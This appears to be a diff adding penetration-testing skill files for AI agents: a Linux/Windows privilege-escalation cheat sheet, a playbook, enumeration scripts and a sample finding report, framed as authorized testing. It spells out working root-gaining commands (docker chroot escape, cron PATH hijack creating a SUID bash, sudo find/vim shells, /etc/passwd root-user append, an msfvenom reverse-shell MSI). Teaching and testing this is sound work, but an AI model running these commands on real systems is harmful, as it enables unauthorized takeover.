@@ -1,0 +1,1117 @@
+[PART 11/14]
+-----
+# sudo env with LD_PRELOAD
+# If env_keep+=LD_PRELOAD is set:
+# Compile shared object that spawns shell
+# sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/any_allowed_command
+```
+
+### PwnKit (CVE-2021-4034)
+```bash
+# Check if vulnerable
+pkexec --version
+# Vulnerable: polkit < 0.120
+
+# Multiple public exploits available
+# Usage: compile and run - instant root
+```
+
+### Dirty Pipe (CVE-2022-0847)
+```bash
+# Check kernel version
+uname -r
+# Vulnerable: 5.8 <= kernel < 5.16.11, 5.15.25, 5.10.102
+
+# Exploit overwrites read-only files via pipe splice
+```
+
+## Workflow 4: Advanced Techniques
+
+### Docker Escape (if user is in docker group)
+```bash
+# Check group membership
+id
+# If in docker group:
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+### NFS Root Squashing Bypass
+```bash
+# Check NFS exports
+showmount -e target
+cat /etc/exports
+# If no_root_squash is set:
+# Mount share, create SUID binary, execute on target
+```
+
+### PATH Hijacking in Cron
+```bash
+# If cron job uses relative paths:
+# Create malicious binary in writable PATH directory
+echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /tmp/command_name
+chmod +x /tmp/command_name
+# Wait for cron to execute, then:
+/tmp/rootbash -p
+```
+
+##### END FILE #####
+
+##### FILE: performing-privilege-escalation-on-linux/scripts/agent.py #####
+#!/usr/bin/env python3
+"""Agent for performing Linux privilege escalation enumeration — authorized testing only."""
+
+import json
+import argparse
+import subprocess
+import os
+import re
+from datetime import datetime
+from pathlib import Path
+
+
+def enumerate_system_info():
+    """Gather basic system information for privilege escalation assessment."""
+    cmds = {
+        "hostname": ["hostname"],
+        "kernel": ["uname", "-a"],
+        "os_release": ["cat", "/etc/os-release"],
+        "architecture": ["uname", "-m"],
+        "current_user": ["whoami"],
+        "id": ["id"],
+        "env_path": ["echo", "$PATH"],
+    }
+    results = {}
+    for key, cmd in cmds.items():
+        try:
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            results[key] = result.stdout.strip()
+        except Exception as e:
+            results[key] = str(e)
+    return {"system_info": results, "timestamp": datetime.utcnow().isoformat()}
+
+
+def check_sudo_permissions():
+    """Check sudo permissions for current user."""
+    try:
+        result = subprocess.run(["sudo", "-l"], capture_output=True, text=True, timeout=10)
+        output = result.stdout + result.stderr
+        escalation_vectors = []
+        dangerous_binaries = [
+            "vim", "vi", "nano", "less", "more", "man", "find", "nmap", "python",
+            "python3", "perl", "ruby", "lua", "awk", "bash", "sh", "env", "cp",
+            "mv", "tar", "zip", "wget", "curl", "ftp", "nc", "ncat", "docker",
+            "lxc", "mount", "strace", "ltrace", "gdb", "journalctl", "systemctl",
+        ]
+        for binary in dangerous_binaries:
+            if binary in output and "NOPASSWD" in output:
+                escalation_vectors.append({"binary": binary, "type": "SUDO_NOPASSWD", "severity": "CRITICAL"})
+            elif binary in output:
+                escalation_vectors.append({"binary": binary, "type": "SUDO_WITH_PASSWORD", "severity": "HIGH"})
+        if "ALL) ALL" in output or "(ALL : ALL) ALL" in output:
+            escalation_vectors.append({"type": "FULL_SUDO", "severity": "CRITICAL"})
+        return {
+            "sudo_output": output[:1000],
+            "escalation_vectors": escalation_vectors,
+            "has_sudo": result.returncode == 0,
+        }
+    except Exception as e:
+        return {"error": str(e)}
+
+
+def find_suid_binaries():
+    """Find SUID/SGID binaries that may allow privilege escalation."""
+    cmd = ["find", "/", "-perm", "-4000", "-type", "f", "-exec", "ls", "-la", "{}", ";"]
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+        binaries = []
+        gtfobins_suid = [
+            "nmap", "vim", "find", "bash", "more", "less", "nano", "cp", "mv",
+            "python", "python3", "perl", "ruby", "awk", "env", "tar", "zip",
+            "docker", "strace", "ltrace", "gdb", "pkexec", "mount",
+        ]
+        for line in result.stdout.strip().splitlines():
+            parts = line.split()
+            if len(parts) >= 9:
+                path = parts[-1]
+                name = Path(path).name
+                exploitable = name in gtfobins_suid
+                binaries.append({
+                    "path": path, "permissions": parts[0],
+                    "owner": parts[2], "group": parts[3],
+                    "exploitable": exploitable,
+                })
+        exploitable = [b for b in binaries if b["exploitable"]]
+        return {
+            "total_suid": len(binaries),
+            "exploitable": len(exploitable),
+            "suid_binaries": binaries[:30],
+            "exploitable_binaries": exploitable,
+        }
+    except Exception as e:
+        return {"error": str(e)}
+
+
+def check_writable_files():
+    """Find world-writable files and directories of interest."""
+    interesting_paths = ["/etc/passwd", "/etc/shadow", "/etc/sudoers", "/etc/crontab",
+                         "/etc/cron.d", "/etc/systemd/system", "/root"]
+    findings = []
+    for path in interesting_paths:
+        p = Path(path)
+        if p.exists():
+            writable = os.access(str(p), os.W_OK)
+            if writable:
+                findings.append({"path": path, "writable": True, "severity": "CRITICAL"})
+    cmd = ["find", "/", "-writable", "-type", "f", "-not", "-path", "'/proc/*'",
+           "-not", "-path", "'/sys/*'", "-not", "-path", "'/dev/*'"]
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
+        writable_files = result.stdout.strip().splitlines()[:50]
+        sensitive = [f for f in writable_files if any(p in f for p in ["/etc/", "/root/", "cron", ".service", "/bin/", "/sbin/"])]
+        findings.extend([{"path": f, "writable": True, "severity": "HIGH"} for f in sensitive[:10]])
+    except Exception:
+        pass
+    return {"writable_findings": findings, "total_findings": len(findings)}
+
+
+def check_cron_jobs():
+    """Enumerate cron jobs for privilege escalation opportunities."""
+    findings = []
+    cron_paths = ["/etc/crontab", "/etc/cron.d", "/var/spool/cron/crontabs"]
+    for path in cron_paths:
+        p = Path(path)
+        if p.is_file():
+            content = p.read_text(encoding="utf-8", errors="replace")
+            for line in content.splitlines():
+                if line.strip() and not line.startswith("#"):
+                    writable_script = re.search(r"(/\S+\.sh|/\S+\.py|/\S+\.pl)", line)
+                    if writable_script:
+                        script = writable_script.group(1)
+                        if Path(script).exists() and os.access(script, os.W_OK):
+                            findings.append({"cron_file": str(p), "script": script, "writable": True, "severity": "CRITICAL"})
+        elif p.is_dir():
+            for f in p.iterdir():
+                if f.is_file():
+                    findings.append({"cron_file": str(f), "type": "cron.d entry"})
+    try:
+        result = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=10)
+        if result.returncode == 0:
+            findings.append({"type": "user_crontab", "content": result.stdout[:500]})
+    except Exception:
+        pass
+    return {"cron_findings": findings}
+
+
+def check_capabilities():
+    """Find binaries with Linux capabilities set."""
+    try:
+        result = subprocess.run(["getcap", "-r", "/"], capture_output=True, text=True, timeout=15)
+        caps = []
+        for line in result.stdout.strip().splitlines():
+            parts = line.split(" = ")
+            if len(parts) == 2:
+                binary = parts[0].strip()
+                cap = parts[1].strip()
+                dangerous = any(c in cap for c in ["cap_setuid", "cap_setgid", "cap_sys_admin", "cap_dac_override", "cap_net_raw"])
+                caps.append({"binary": binary, "capabilities": cap, "dangerous": dangerous})
+        return {"capabilities": caps, "dangerous_caps": [c for c in caps if c["dangerous"]]}
+    except Exception as e:
+        return {"error": str(e)}
+
+
+def full_enumeration():
+    """Run complete privilege escalation enumeration."""
+    return {
+        "timestamp": datetime.utcnow().isoformat(),
+        "system": enumerate_system_info(),
+        "sudo": check_sudo_permissions(),
+        "suid": find_suid_binaries(),
+        "writable": check_writable_files(),
+        "cron": check_cron_jobs(),
+        "capabilities": check_capabilities(),
+    }
+
+
+def main():
+    parser = argparse.ArgumentParser(description="Linux Privilege Escalation Enumeration Agent (Authorized Only)")
+    sub = parser.add_subparsers(dest="command")
+    sub.add_parser("sysinfo", help="System information")
+    sub.add_parser("sudo", help="Check sudo permissions")
+    sub.add_parser("suid", help="Find SUID/SGID binaries")
+    sub.add_parser("writable", help="Find writable sensitive files")
+    sub.add_parser("cron", help="Enumerate cron jobs")
+    sub.add_parser("caps", help="Check Linux capabilities")
+    sub.add_parser("full", help="Full enumeration")
+    args = parser.parse_args()
+    if args.command == "sysinfo":
+        result = enumerate_system_info()
+    elif args.command == "sudo":
+        result = check_sudo_permissions()
+    elif args.command == "suid":
+        result = find_suid_binaries()
+    elif args.command == "writable":
+        result = check_writable_files()
+    elif args.command == "cron":
+        result = check_cron_jobs()
+    elif args.command == "caps":
+        result = check_capabilities()
+    elif args.command == "full":
+        result = full_enumeration()
+    else:
+        parser.print_help()
+        return
+    print(json.dumps(result, indent=2, default=str))
+
+
+if __name__ == "__main__":
+    main()
+
+##### END FILE #####
+
+##### FILE: performing-privilege-escalation-assessment/SKILL.md #####
+---
+name: performing-privilege-escalation-assessment
+description: 'Performs privilege escalation assessments on compromised Linux and Windows
+  systems to identify paths from low-privilege access to root or SYSTEM-level control.
+  The tester enumerates misconfigurations, vulnerable services, kernel exploits, SUID
+  binaries, unquoted service paths, and credential stores to demonstrate the full
+  impact of an initial compromise. Activates for requests involving privilege escalation
+  testing, local exploitation, post-compromise escalation, or OS-level security assessment.
+
+  '
+domain: cybersecurity
+subdomain: penetration-testing
+tags:
+- privilege-escalation
+- post-exploitation
+- Linux-privesc
+- Windows-privesc
+- local-exploitation
+version: 1.0.0
+author: mahipal
+license: Apache-2.0
+d3fend_techniques:
+- Executable Denylisting
+- Execution Isolation
+- File Metadata Consistency Validation
+- Restore Access
+- Password Authentication
+nist_csf:
+- ID.RA-01
+- ID.RA-06
+- GV.OV-02
+- DE.AE-07
+mitre_attack:
+- T1595
+- T1190
+- T1059
+- T1078
+- T1068
+---
+# Performing Privilege Escalation Assessment
+
+## When to Use
+
+- After gaining initial low-privilege access during a penetration test to demonstrate full system compromise
+- Assessing the security hardening of Linux and Windows servers against local privilege escalation attacks
+- Evaluating whether endpoint detection and response (EDR) tools detect common privilege escalation techniques
+- Testing the effectiveness of least-privilege policies and application whitelisting on endpoints
+- Validating that container breakout and VM escape controls are properly configured
+
+**Do not use** without written authorization, against production systems where exploitation could cause downtime, or for deploying kernel exploits on systems without prior approval and rollback capability.
+
+## Prerequisites
+
+- Low-privilege shell access (reverse shell, SSH, RDP) to the target system obtained through authorized means
+- Privilege escalation enumeration scripts: linPEAS (Linux), winPEAS (Windows), Linux Smart Enumeration (LSE)
+- Compiled kernel exploits for common CVEs or access to compilation tools on the target
+- GTFOBins reference for Linux SUID/sudo binary abuse and LOLBAS reference for Windows living-off-the-land binaries
+- Precompiled post-exploitation binaries for the target architecture if compilation is not available on the target
+
+## Workflow
+
+### Step 1: System Enumeration
+
+Gather comprehensive information about the target system:
+
+**Linux Enumeration:**
+- `id && whoami` - Current user and group memberships
+- `uname -a` - Kernel version for kernel exploit identification
+- `cat /etc/os-release` - Distribution and version
+- `sudo -l` - Commands the current user can run as root via sudo
+- `find / -perm -4000 -type f 2>/dev/null` - SUID binaries
+- `find / -perm -2000 -type f 2>/dev/null` - SGID binaries
+- `crontab -l && ls -la /etc/cron*` - Scheduled tasks running as root
+- `ps aux | grep root` - Processes running as root
+- `cat /etc/passwd` - User accounts (look for additional users with UID 0)
+- `find / -writable -type d 2>/dev/null` - World-writable directories
+- Run `linpeas.sh` for automated comprehensive enumeration
+
+**Windows Enumeration:**
+- `whoami /priv` - Current user privileges (look for SeImpersonatePrivilege, SeDebugPrivilege)
+- `systeminfo` - OS version, hotfix level, architecture
+- `wmic service get name,pathname,startmode` - Unquoted service paths
+- `icacls "C:\Program Files" /T` - Writable directories in Program Files
+- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` - AlwaysInstallElevated check
+- `cmdkey /list` - Stored Windows credentials
+- `schtasks /query /fo LIST /v` - Scheduled tasks with their run-as accounts
+- Run `winPEAS.exe` for automated comprehensive enumeration
+
+### Step 2: Linux Privilege Escalation Vectors
+
+Test identified escalation vectors systematically:
+
+- **Sudo misconfigurations**: If `sudo -l` shows entries like `(ALL) NOPASSWD: /usr/bin/vim`, use GTFOBins to escalate:
+  - `sudo vim -c ':!/bin/bash'` to spawn a root shell
+  - Common dangerous sudo entries: vim, less, find, nmap, python, perl, ruby, awk, env
+- **SUID binary abuse**: If a SUID binary is identified that allows arbitrary command execution, shell escape, or file read:
+  - Custom SUID: Check if a custom SUID binary calls other programs without absolute paths (PATH injection)
+  - Known SUID: Check GTFOBins for exploitation of standard SUID binaries
+- **Cron job exploitation**: If a cron job runs a script writable by the current user, or runs a script from a writable directory:
+  - Modify the script to add a reverse shell or SUID copy of bash
+  - PATH-based cron exploitation: if the cron job calls a command without absolute path and PATH is writable
+- **Kernel exploits**: Match the kernel version to known exploits:
+  - DirtyPipe (CVE-2022-0847): Linux kernel 5.8-5.16.11
+  - DirtyCow (CVE-2016-5195): Linux kernel 2.6.22-4.8.3
+  - PwnKit (CVE-2021-4034): Polkit pkexec vulnerability affecting most Linux distributions
+- **Capabilities abuse**: `getcap -r / 2>/dev/null` to find binaries with elevated capabilities (cap_setuid, cap_dac_override)
+- **Writable /etc/passwd**: If /etc/passwd is writable, add a new root user: `echo 'newroot:$1$hash:0:0::/root:/bin/bash' >> /etc/passwd`
+
+### Step 3: Windows Privilege Escalation Vectors
+
+Test Windows-specific escalation paths:
+
+- **Token impersonation**: If the user has `SeImpersonatePrivilege` (common for service accounts and IIS):
+  - Use `JuicyPotato.exe`, `PrintSpoofer.exe`, or `GodPotato.exe` to impersonate SYSTEM
+  - `PrintSpoofer.exe -i -c "cmd /c whoami"` -> `NT AUTHORITY\SYSTEM`
+- **Unquoted service paths**: If a service has an unquoted path with spaces (e.g., `C:\Program Files\My App\service.exe`) and you can write to an intermediate directory:
+  - Place a malicious executable at `C:\Program Files\My.exe` which will execute when the service restarts
+- **Writable service binaries**: If you can modify the executable of a service running as SYSTEM:
+  - Replace the binary with a reverse shell and restart the service
+- **AlwaysInstallElevated**: If both HKLM and HKCU AlwaysInstallElevated registry keys are set to 1:
+  - Generate a malicious MSI: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o shell.msi`
+  - Install with elevated privileges: `msiexec /quiet /qn /i shell.msi`
+- **Stored credentials**: Check for credentials in `cmdkey /list`, AutoLogon registry keys, unattend.xml, web.config files, and PowerShell history
+- **DLL hijacking**: Identify services that load DLLs from writable directories. Use Process Monitor to find missing DLL loads, then place a malicious DLL.
+- **Scheduled tasks**: Find tasks running as SYSTEM with writable scripts or binaries
+
+### Step 4: Container and Cloud Escalation
+
+Test for escalation paths in containerized and cloud environments:
+
+- **Docker breakout**: Check if the container runs in privileged mode (`--privileged`), has the Docker socket mounted (`/var/run/docker.sock`), or has `SYS_ADMIN` capability
+- **Kubernetes pod escalation**: Check for service account tokens with cluster-admin rights, hostPID/hostNetwork namespaces, or hostPath volume mounts
+- **Cloud metadata**: Access cloud instance metadata from compromised hosts (`http://169.254.169.254/latest/meta-data/`) to discover IAM roles, credentials, and instance information
+- **IAM role abuse**: If cloud credentials are discovered, enumerate IAM permissions and test for privilege escalation through IAM policy manipulation
+
+### Step 5: Documentation and Impact Assessment
+
+Document the complete escalation path and business impact:
+
+- Record every command executed during escalation with timestamps
+- Capture proof of elevated access (whoami showing root/SYSTEM, accessing restricted files)
+- Document what data or systems become accessible at the elevated privilege level
+- Map the escalation technique to MITRE ATT&CK (T1548 - Abuse Elevation Control Mechanism, T1068 - Exploitation for Privilege Escalation)
+- Provide specific remediation for each identified escalation vector
+
+## Key Concepts
+
+| Term | Definition |
+|------|------------|
+| **SUID Binary** | A Linux binary with the Set User ID bit enabled, which executes with the file owner's privileges (typically root) regardless of who runs it |
+| **SeImpersonatePrivilege** | A Windows privilege that allows a process to impersonate another user's security token, commonly abused by service accounts to escalate to SYSTEM |
+| **Kernel Exploit** | An exploit targeting a vulnerability in the operating system kernel to gain ring-0 or root/SYSTEM-level access |
+| **GTFOBins** | A curated list of Unix binaries that can be exploited for privilege escalation, file read/write, or shell escape when misconfigured |
+| **LOLBAS** | Living Off The Land Binaries and Scripts; legitimate Windows binaries that can be abused for code execution, file operations, or persistence |
+| **DLL Hijacking** | Exploiting the DLL search order on Windows to load a malicious DLL by placing it in a directory searched before the legitimate DLL location |
+| **Token Impersonation** | A Windows technique where a compromised process with appropriate privileges captures and uses another user's access token to execute commands as that user |
+
+## Tools & Systems
+
+- **linPEAS / winPEAS**: Automated privilege escalation enumeration scripts that check hundreds of potential escalation vectors on Linux and Windows
+- **GTFOBins / LOLBAS**: Reference databases of Unix binaries and Windows binaries that can be exploited for privilege escalation when misconfigured
+- **PrintSpoofer / GodPotato**: Windows privilege escalation tools that exploit `SeImpersonatePrivilege` to achieve SYSTEM-level access from service accounts
+- **Linux Exploit Suggester**: Script that compares the target kernel version against a database of known kernel exploits to identify applicable exploits
+
+## Common Scenarios
+
+### Scenario: Privilege Escalation on a Linux Web Server
+
+**Context**: During a penetration test, the tester gained a low-privilege shell as `www-data` on an Ubuntu 22.04 web server through a PHP file upload vulnerability. The goal is to escalate to root to demonstrate full server compromise.
+
+**Approach**:
+1. Run `linpeas.sh` which identifies that `www-data` can run `/usr/bin/find` as root via sudo without a password
+2. Verify with `sudo -l`: `(root) NOPASSWD: /usr/bin/find`
+3. Consult GTFOBins for the `find` sudo entry: `sudo find . -exec /bin/bash -p \; -quit`
+4. Execute the command and obtain a root shell
+5. As root, access `/etc/shadow` to extract password hashes, read database credentials from the application configuration, and access the MySQL database containing customer PII
+6. Document: initial access as www-data -> sudo misconfiguration -> root shell -> database access -> 75,000 customer records accessible
+
+**Pitfalls**:
+- Running kernel exploits without testing on a similar system first, risking a kernel panic and system crash
+- Not checking for container environments where apparent root access may be limited to the container namespace
+- Ignoring cloud metadata endpoints accessible from the compromised host that may yield IAM credentials
+- Failing to enumerate capabilities and SUID binaries after checking sudo, missing alternative escalation paths
+
+## Output Format
+
+```
+## Finding: Sudo Misconfiguration Allowing Root Escalation via find
+
+**ID**: PRIV-001
+**Severity**: Critical (CVSS 8.8)
+**Affected Host**: web-prod-01 (10.10.5.15)
+**OS**: Ubuntu 22.04 LTS
+**Initial Access**: www-data (via PHP file upload - WEB-004)
+**Escalation Technique**: MITRE ATT&CK T1548.003 - Sudo and Sudo Caching
+
+**Description**:
+The www-data user is configured in /etc/sudoers to execute /usr/bin/find as root
+without a password. The find command supports the -exec flag which can spawn a
+root shell, effectively granting www-data unrestricted root access.
+
+**Proof of Concept**:
+www-data@web-prod-01:~$ sudo -l
+(root) NOPASSWD: /usr/bin/find
+www-data@web-prod-01:~$ sudo find . -exec /bin/bash -p \; -quit
+root@web-prod-01:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+**Impact**:
+Full root access on the production web server. From root, the tester accessed
+database credentials in /var/www/app/.env, connected to MySQL, and confirmed
+read access to 75,000 customer records including names, emails, and addresses.
+
+**Remediation**:
+1. Remove the /usr/bin/find sudo entry for www-data
+2. If find access is required, restrict it to specific directories with --no-exec
+3. Audit all sudo entries for binaries listed in GTFOBins
+4. Implement sudo logging with auditd for all privileged command execution
+```
+
+##### END FILE #####
+
+##### FILE: performing-privilege-escalation-assessment/LICENSE #####
+
+                                 Apache License
+                           Version 2.0, January 2004
+                        http://www.apache.org/licenses/
+
+   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION
+
+   1. Definitions.
+
+      "License" shall mean the terms and conditions for use, reproduction,
+      and distribution as defined by Sections 1 through 9 of this document.
+
+      "Licensor" shall mean the copyright owner or entity authorized by
+      the copyright owner that is granting the License.
+
+      "Legal Entity" shall mean the union of the acting entity and all
+      other entities that control, are controlled by, or are under common
+      control with that entity. For the purposes of this definition,
+      "control" means (i) the power, direct or indirect, to cause the
+      direction or management of such entity, whether by contract or
+      otherwise, or (ii) ownership of fifty percent (50%) or more of the
+      outstanding shares, or (iii) beneficial ownership of such entity.
+
+      "You" (or "Your") shall mean an individual or Legal Entity
+      exercising permissions granted by this License.
+
+      "Source" form shall mean the preferred form for making modifications,
+      including but not limited to software source code, documentation
+      source, and configuration files.
+
+      "Object" form shall mean any form resulting from mechanical
+      transformation or translation of a Source form, including but
+      not limited to compiled object code, generated documentation,
+      and conversions to other media types.
+
+      "Work" shall mean the work of authorship, whether in Source or
+      Object form, made available under the License, as indicated by a
+      copyright notice that is included in or attached to the work
+      (an example is provided in the Appendix below).
+
+      "Derivative Works" shall mean any work, whether in Source or Object
+      form, that is based on (or derived from) the Work and for which the
+      editorial revisions, annotations, elaborations, or other modifications
+      represent, as a whole, an original work of authorship. For the purposes
+      of this License, Derivative Works shall not include works that remain
+      separable from, or merely link (or bind by name) to the interfaces of,
+      the Work and Derivative Works thereof.
+
+      "Contribution" shall mean any work of authorship, including
+      the original version of the Work and any modifications or additions
+      to that Work or Derivative Works thereof, that is intentionally
+      submitted to the Licensor for inclusion in the Work by the copyright owner
+      or by an individual or Legal Entity authorized to submit on behalf of
+      the copyright owner. For the purposes of this definition, "submitted"
+      means any form of electronic, verbal, or written communication sent
+      to the Licensor or its representatives, including but not limited to
+      communication on electronic mailing lists, source code control systems,
+      and issue tracking systems that are managed by, or on behalf of, the
+      Licensor for the purpose of discussing and improving the Work, but
+      excluding communication that is conspicuously marked or otherwise
+      designated in writing by the copyright owner as "Not a Contribution."
+
+      "Contributor" shall mean Licensor and any individual or Legal Entity
+      on behalf of whom a Contribution has been received by the Licensor and
+      subsequently incorporated within the Work.
+
+   2. Grant of Copyright License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      copyright license to reproduce, prepare Derivative Works of,
+      publicly display, publicly perform, sublicense, and distribute the
+      Work and such Derivative Works in Source or Object form.
+
+   3. Grant of Patent License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      (except as stated in this section) patent license to make, have made,
+      use, offer to sell, sell, import, and otherwise transfer the Work,
+      where such license applies only to those patent claims licensable
+      by such Contributor that are necessarily infringed by their
+      Contribution(s) alone or by combination of their Contribution(s)
+      with the Work to which such Contribution(s) was submitted. If You
+      institute patent litigation against any entity (including a
+      cross-claim or counterclaim in a lawsuit) alleging that the Work
+      or a Contribution incorporated within the Work constitutes direct
+      or contributory patent infringement, then any patent licenses
+      granted to You under this License for that Work shall terminate
+      as of the date such litigation is filed.
+
+   4. Redistribution. You may reproduce and distribute copies of the
+      Work or Derivative Works thereof in any medium, with or without
+      modifications, and in Source or Object form, provided that You
+      meet the following conditions:
+
+      (a) You must give any other recipients of the Work or
+          Derivative Works a copy of this License; and
+
+      (b) You must cause any modified files to carry prominent notices
+          stating that You changed the files; and
+
+      (c) You must retain, in the Source form of any Derivative Works
+          that You distribute, all copyright, patent, trademark, and
+          attribution notices from the Source form of the Work,
+          excluding those notices that do not pertain to any part of
+          the Derivative Works; and
+
+      (d) If the Work includes a "NOTICE" text file as part of its
+          distribution, then any Derivative Works that You distribute must
+          include a readable copy of the attribution notices contained
+          within such NOTICE file, excluding any notices that do not
+          pertain to any part of the Derivative Works, in at least one
+          of the following places: within a NOTICE text file distributed
+          as part of the Derivative Works; within the Source form or
+          documentation, if provided along with the Derivative Works; or,
+          within a display generated by the Derivative Works, if and
+          wherever such third-party notices normally appear. The contents
+          of the NOTICE file are for informational purposes only and
+          do not modify the License. You may add Your own attribution
+          notices within Derivative Works that You distribute, alongside
+          or as an addendum to the NOTICE text from the Work, provided
+          that such additional attribution notices cannot be construed
+          as modifying the License.
+
+      You may add Your own copyright statement to Your modifications and
+      may provide additional or different license terms and conditions
+      for use, reproduction, or distribution of Your modifications, or
+      for any such Derivative Works as a whole, provided Your use,
+      reproduction, and distribution of the Work otherwise complies with
+      the conditions stated in this License.
+
+   5. Submission of Contributions. Unless You explicitly state otherwise,
+      any Contribution intentionally submitted for inclusion in the Work
+      by You to the Licensor shall be under the terms and conditions of
+      this License, without any additional terms or conditions.
+      Notwithstanding the above, nothing herein shall supersede or modify
+      the terms of any separate license agreement you may have executed
+      with Licensor regarding such Contributions.
+
+   6. Trademarks. This License does not grant permission to use the trade
+      names, trademarks, service marks, or product names of the Licensor,
+      except as required for reasonable and customary use in describing the
+      origin of the Work and reproducing the content of the NOTICE file.
+
+   7. Disclaimer of Warranty. Unless required by applicable law or
+      agreed to in writing, Licensor provides the Work (and each
+      Contributor provides its Contributions) on an "AS IS" BASIS,
+      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
+      implied, including, without limitation, any warranties or conditions
+      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
+      PARTICULAR PURPOSE. You are solely responsible for determining the
+      appropriateness of using or redistributing the Work and assume any
+      risks associated with Your exercise of permissions under this License.
+
+   8. Limitation of Liability. In no event and under no legal theory,
+      whether in tort (including negligence), contract, or otherwise,
+      unless required by applicable law (such as deliberate and grossly
+      negligent acts) or agreed to in writing, shall any Contributor be
+      liable to You for damages, including any direct, indirect, special,
+      incidental, or consequential damages of any character arising as a
+      result of this License or out of the use or inability to use the
+      Work (including but not limited to damages for loss of goodwill,
+      work stoppage, computer failure or malfunction, or any and all
+      other commercial damages or losses), even if such Contributor
+      has been advised of the possibility of such damages.
+
+   9. Accepting Warranty or Additional Liability. While redistributing
+      the Work or Derivative Works thereof, You may choose to offer,
+      and charge a fee for, acceptance of support, warranty, indemnity,
+      or other liability obligations and/or rights consistent with this
+      License. However, in accepting such obligations, You may act only
+      on Your own behalf and on Your sole responsibility, not on behalf
+      of any other Contributor, and only if You agree to indemnify,
+      defend, and hold each Contributor harmless for any liability
+      incurred by, or claims asserted against, such Contributor by reason
+      of your accepting any such warranty or additional liability.
+
+   END OF TERMS AND CONDITIONS
+
+   APPENDIX: How to apply the Apache License to your work.
+
+      To apply the Apache License to your work, attach the following
+      boilerplate notice, with the fields enclosed by brackets "[]"
+      replaced with your own identifying information. (Don't include
+      the brackets!)  The text should be enclosed in the appropriate
+      comment syntax for the file format. Please do not remove or change
+      the license header comment from a contributed file except when
+      necessary.
+
+   Copyright 2026 mukul975
+
+   Licensed under the Apache License, Version 2.0 (the "License");
+   you may not use this file except in compliance with the License.
+   You may obtain a copy of the License at
+
+       http://www.apache.org/licenses/LICENSE-2.0
+
+   Unless required by applicable law or agreed to in writing, software
+   distributed under the License is distributed on an "AS IS" BASIS,
+   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+   See the License for the specific language governing permissions and
+   limitations under the License.
+
+##### END FILE #####
+
+##### FILE: performing-privilege-escalation-assessment/references/api-reference.md #####
+# API Reference: Privilege Escalation Assessment
+
+## Linux Enumeration Commands
+
+| Command | Description |
+|---------|-------------|
+| `id && whoami` | Current user and group memberships |
+| `uname -a` | Kernel version for exploit matching |
+| `sudo -l` | Sudo permissions for current user |
+| `find / -perm -4000 -type f 2>/dev/null` | SUID binaries |
+| `find / -perm -2000 -type f 2>/dev/null` | SGID binaries |
+| `getcap -r / 2>/dev/null` | Binaries with Linux capabilities |
+| `cat /etc/crontab` | System cron jobs |
+| `ps aux \| grep root` | Processes running as root |
+
+## Windows Enumeration Commands
+
+| Command | Description |
+|---------|-------------|
+| `whoami /priv` | User privileges (SeImpersonate, SeDebug) |
+| `systeminfo` | OS version and hotfix level |
+| `wmic service get name,pathname,startmode` | Unquoted service paths |
+| `reg query HKLM\...\Installer /v AlwaysInstallElevated` | MSI escalation |
+| `cmdkey /list` | Stored Windows credentials |
+
+## MITRE ATT&CK Techniques
+
+| Technique | ID | Description |
+|-----------|----|-------------|
+| Sudo Abuse | T1548.003 | Exploiting sudo misconfiguration |
+| SUID/SGID Abuse | T1548.001 | Abusing setuid/setgid binaries |
+| Scheduled Task | T1053.003 | Cron job manipulation |
+| Kernel Exploit | T1068 | Exploiting kernel vulnerabilities |
+| Token Impersonation | T1134.001 | Windows token manipulation |
+
+## Python Libraries
+
+| Library | Version | Purpose |
+|---------|---------|---------|
+| `subprocess` | stdlib | Execute system enumeration commands |
+| `pathlib` | stdlib | File system permission checks |
+| `os` | stdlib | Access and write permission verification |
+
+## References
+
+- GTFOBins: https://gtfobins.github.io/
+- LOLBAS: https://lolbas-project.github.io/
+- linPEAS: https://github.com/carlospolop/PEASS-ng
+- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester
+
+##### END FILE #####
+
+##### FILE: performing-privilege-escalation-assessment/scripts/agent.py #####
+#!/usr/bin/env python3
+"""Agent for performing privilege escalation assessment.
+
+Enumerates potential privilege escalation vectors on Linux systems
+including SUID binaries, sudo misconfigurations, writable cron jobs,
+capabilities, and kernel version checks.
+"""
+
+import subprocess
+import shlex
+import json
+import sys
+from pathlib import Path
+from datetime import datetime
+
+
+class PrivescAssessmentAgent:
+    """Enumerates privilege escalation vectors on Linux systems."""
+
+    def __init__(self, output_dir):
+        self.output_dir = Path(output_dir)
+        self.output_dir.mkdir(parents=True, exist_ok=True)
+        self.findings = []
+
+    def _run(self, cmd, timeout=30):
+        """Execute a command and return output."""
+        try:
+            # Strip shell stderr redirects and detect shell operators
+            clean_cmd = cmd.replace("2>/dev/null", "").strip()
+            needs_shell = any(op in clean_cmd for op in ("|", ";", "&&", "||"))
+            result = subprocess.run(
+                clean_cmd if needs_shell else shlex.split(clean_cmd),
+                shell=needs_shell, capture_output=True, text=True, timeout=timeout
+            )
+            return result.stdout.strip()
+        except (subprocess.TimeoutExpired, FileNotFoundError, ValueError):
+            return ""
+
+    def get_system_info(self):
+        """Gather system information for kernel exploit matching."""
+        return {
+            "hostname": self._run("hostname"),
+            "kernel": self._run("uname -r"),
+            "arch": self._run("uname -m"),
+            "os_release": self._run("cat /etc/os-release 2>/dev/null | head -5"),
+            "current_user": self._run("whoami"),
+            "user_id": self._run("id"),
+            "groups": self._run("groups"),
+        }
+
+    def check_sudo(self):
+        """Check sudo configuration for escalation vectors."""
